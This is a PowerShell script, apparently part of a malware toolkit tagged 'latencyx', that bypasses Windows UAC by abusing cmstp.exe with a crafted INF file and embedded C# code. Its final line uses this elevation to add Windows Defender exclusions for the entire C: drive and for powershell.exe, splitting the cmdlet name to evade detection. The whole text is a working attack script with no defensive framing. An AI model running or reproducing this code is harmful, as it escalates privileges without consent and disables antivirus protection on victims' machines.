function latencyx-Invoke-UAC {
<#
 
.SYNOPSIS
This script is designed to bypass UAC on Windows when the current user is an administrator, and UAC is set to the default level.

#>

param(
    [Parameter(Mandatory = $true)]
    [string]$latencyxExecutable,
 
    [Parameter()]
    [string]$latencyxCommand
)

$latencyxInfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=latencyx-CustInstDestSectionAllUsers
RunPreSetupCommands=latencyx-RunPreSetupCommandsSection

[latencyx-RunPreSetupCommandsSection]
LINE
taskkill /IM cmstp.exe /F

[latencyx-CustInstDestSectionAllUsers]
49000,49001=latencyx-AllUSer_LDIDSection, 7

[latencyx-AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="latencyxVPN"
ShortSvcName="latencyxVPN"
'@

$latencyxCode = @"
using System;
using System.Threading;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Runtime.InteropServices;

public class latencyxCMSTPBypass
{
    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

    [DllImport("user32.dll")]
    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

    [DllImport("user32.dll")]
    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);

    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";

    public static string SetInfFile(string CommandToExecute, string InfData)
    {
        StringBuilder OutputFile = new StringBuilder();
        OutputFile.Append("C:\\windows\\temp");
        OutputFile.Append("\\");
        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
        OutputFile.Append(".inf");
        StringBuilder newInfData = new StringBuilder(InfData);
        newInfData.Replace("LINE", CommandToExecute);
        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
        return OutputFile.ToString();
    }

    public static bool latencyxExecute(string CommandToExecute, string InfData)
    {
        const int WM_SYSKEYDOWN = 0x0100;
        const int VK_RETURN = 0x0D;

        StringBuilder InfFile = new StringBuilder();
        InfFile.Append(SetInfFile(CommandToExecute, InfData));

        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
        startInfo.Arguments = "/au " + InfFile.ToString();
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Hidden window
        IntPtr dptr = Marshal.AllocHGlobal(1);
        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments, "", 0);

        Thread.Sleep(3000);
        IntPtr WindowToFind = FindWindow(null, "latencyxVPN");

        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);
        Thread.Sleep(5000);
        File.Delete(InfFile.ToString());
        return true;
    }
}
"@

$latencyxConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
$latencyxSecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
if ($latencyxConsentPrompt -Eq 2 -and $latencyxSecureDesktopPrompt -Eq 1) {
    return
}

try {
    $latencyxUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $latencyxAdm = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $latencyxUser }
} catch {
    $latencyxUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $latencyxAdminGroupSID = 'S-1-5-32-544'
    $latencyxAdminGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.SID -eq $latencyxAdminGroupSID }
    $latencyxMembers = $latencyxAdminGroup.GetRelated("Win32_UserAccount")
    $latencyxMembers | ForEach-Object { if ($_.Caption -eq $latencyxUser) { $latencyxAdm = $true } }
}

if (!$latencyxAdm) {
    return
}

try {
    if (![System.IO.File]::Exists($latencyxExecutable)) {
        $latencyxEx = (Get-Command $latencyxExecutable)
        if (![System.IO.File]::Exists($latencyxEx.Source)) {
            $latencyxExecutable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($latencyxExecutable)
            if (![System.IO.File]::Exists($latencyxExecutable)) {
                return
            }
        } else {
            $latencyxExecutable = (Get-Command $latencyxExecutable).Name
        }
    }
} catch {
    return
}

if ($latencyxExecutable.Contains("powershell")) {
    if ($latencyxCommand -ne "") {
        $latencyxFinal = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""
    } else {
        $latencyxFinal = "$latencyxExecutable $latencyxCommand"
    }
} elseif ($latencyxExecutable.Contains("cmd")) {
    if ($latencyxCommand -ne "") {
        $latencyxFinal = "cmd /c ""$latencyxCommand"""  # Changed to /c to close the cmd window
    } else {
        $latencyxFinal = "$latencyxExecutable $latencyxCommand"
    }
} else {
    $latencyxFinal = "$latencyxExecutable $latencyxCommand"
}

function latencyxExecute {
    try {
        $latencyxResult = [latencyxCMSTPBypass]::latencyxExecute($latencyxFinal, $latencyxInfData)
    } catch {
        Add-Type $latencyxCode
        $latencyxResult = [latencyxCMSTPBypass]::latencyxExecute($latencyxFinal, $latencyxInfData)
    }

    if ($latencyxResult) {
        return
    } else {
        return
    }
}

$latencyxProcess = ((Get-WmiObject -Class win32_process).name | Select-String "cmstp" | Select-Object * -First 1).Pattern
if ($latencyxProcess -eq "cmstp") {
    try {
        Stop-Process -Name "cmstp" -Force
        latencyxExecute
    } catch {
        return
    }
} else {
    latencyxExecute
}
}

# Function Call
latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\ -ExclusionProcess Powershell.exe"
